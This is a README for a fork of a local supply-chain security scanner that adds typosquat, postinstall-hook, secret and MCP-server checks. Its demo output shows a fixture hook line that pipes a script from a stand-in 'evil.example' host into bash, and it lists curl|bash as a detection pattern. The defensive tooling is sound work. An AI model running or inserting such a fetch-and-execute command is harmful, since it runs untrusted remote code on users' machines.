# Bumblebee — Sentinel Edition

A zero-token, local-first supply-chain security suite for developer machines.
Fork of [perplexityai/bumblebee](https://github.com/perplexityai/bumblebee)
(Apache-2.0, attribution retained — see `LICENSE`; upstream README preserved
as `README-upstream.md`).

Upstream Bumblebee answers *"which machines have this compromised package?"*
Sentinel Edition adds the missing operational loop: **continuous monitoring,
detection heuristics, and alerting — all running locally, no APIs, no tokens.**

```
bumblebee scan (NDJSON)
        │
        ▼
┌───────────────────────────────────────────────────┐
│ SENTINEL LAYER (bash/python, ~2k LOC)              │
│  diff → typosquat → postinstall → secretscan ─┐   │
│  mcp-audit → reachability → sbom → winnative ─┤   │
└───────────────────────────────────────────────┼───┘
                                                ▼
                              notify (webhook, silent unless dirty)
```

## The 10 tools

| Tool | What it does |
|---|---|
| `sentinel-diff` | Baseline diff of installed packages — reports only new/gone/changed |
| `sentinel-refresh` | Weekly OSV advisory catalog refresh (atomic swap + last-good fallback) |
| `sentinel-mcp-audit` | Audits MCP servers vs allowlist (names only — never touches env values) |
| `sentinel-notify` | Webhook alerts with hash dedup — **silent when clean** |
| `sentinel-postinstall` | Scores suspicious install hooks (`curl\|bash`, `eval(`, …) 0–10 |
| `sentinel-sbom` | CycloneDX 1.5 SBOM generation |
| `sentinel-typosquat` | Damerau-Levenshtein vs curated popular packages (npm/PyPI) |
| `sentinel-secretscan` | **Opt-in** secret pattern scan — never emits secret values |
| `sentinel-reachability` | Installed-vs-imported analysis via AST (no code execution) |
| `sentinel-winnative` | Read-only Windows inventory via WSL interop |

## Design principles

1. **Zero token** — everything runs locally on the monitored machine. The
   advisory catalog refresh uses bandwidth, not API calls.
2. **Silent unless dirty** — every tool exits 0 with no output when there's
   nothing to report. Alerts are the exception, not the rule.
3. **Privacy by design** — `sentinel-secretscan` is fully opt-in
   (`SENTINEL_SECRETSCAN=1`), never emits secret values (only pattern type +
   `file:line`), and skips credential stores (`~/.ssh`, `~/.aws`, …).
4. **Non-invasive fork** — upstream Go core is untouched; Sentinel is a script
   layer over NDJSON output, keeping rebases cheap.

## Quickstart

```bash
# 1. Build upstream binary (Go 1.25+)
go build -o ~/.local/bin/bumblebee ./cmd/bumblebee

# 2. Install Sentinel tools
cp sentinel/*.sh ~/.local/bin/ && chmod +x ~/.local/bin/sentinel-*

# 3. Daily pipeline (cron) — silent when clean
0 7 * * * ~/.local/bin/sentinel-daily
# Weekly catalog refresh
0 4 * * 0 ~/.local/bin/sentinel-refresh

# 4. Manual run
~/.local/bin/sentinel-diff && ~/.local/bin/sentinel-mcp-audit && ~/.local/bin/sentinel-notify
SENTINEL_SECRETSCAN=1 ~/.local/bin/sentinel-secretscan   # opt-in
```

Configure the webhook via `MEJA_API` and `SENTINEL_TOKEN_FILE` env vars.

## Verified by adversarial simulation

Each detector was tested against crafted fixtures in an isolated sandbox
(see `simulator-SKENARIO.md`):

- **S-01**: typosquat fixture `lodahs` → flagged `[distance=1 HIGH]`
- **S-02**: malicious `postinstall` hook fixture → flagged (read-only analysis, never executed)
- **S-03**: fake secret fixtures → caught **and** exposed a real gap:
  `db_password` slipped past a strict `\b` regex — fixed, re-tested, no value leakage

## See it in action

```console
$ sentinel-typosquat
[typosquat jarak=1 TINGGI] lodahs@9.9.9 (npm) mirip 'lodash'

$ sentinel-postinstall
[mencurigakan skor=4] evil-fixture-pkg@1.0.0 :: postinstall
  cmd: curl -s http://evil.example/x.sh | bash

$ SENTINEL_SECRETSCAN=1 sentinel-secretscan
[secret aws-key] ./app.conf:2
[secret generic] ./app.conf:3
# values are never printed — only pattern type + file:line

$ sentinel-diff
=== Sentinel diff 2026-10-16 ===
baru: 0 | hilang: 0 | total kini: 90
# ...and when there's nothing to report, tools stay silent.
```

## Experimental

- `ide-liar-GATE.md` — canary honeypot (deployed) and self-attack simulator
  (gated per-scenario). Premortem-first: nothing runs without an explicit gate.

## Layout

- `sentinel/` — the 10 tools + `SKILL.md`
- `cmd/`, `internal/` — upstream Go core (unmodified)
- `BLUEPRINT.md` — architecture, threat model, premortem
- `SENTINEL.md` — operations manual

## License

Apache-2.0. Upstream code © Perplexity AI. Sentinel layer © the homelab operator.
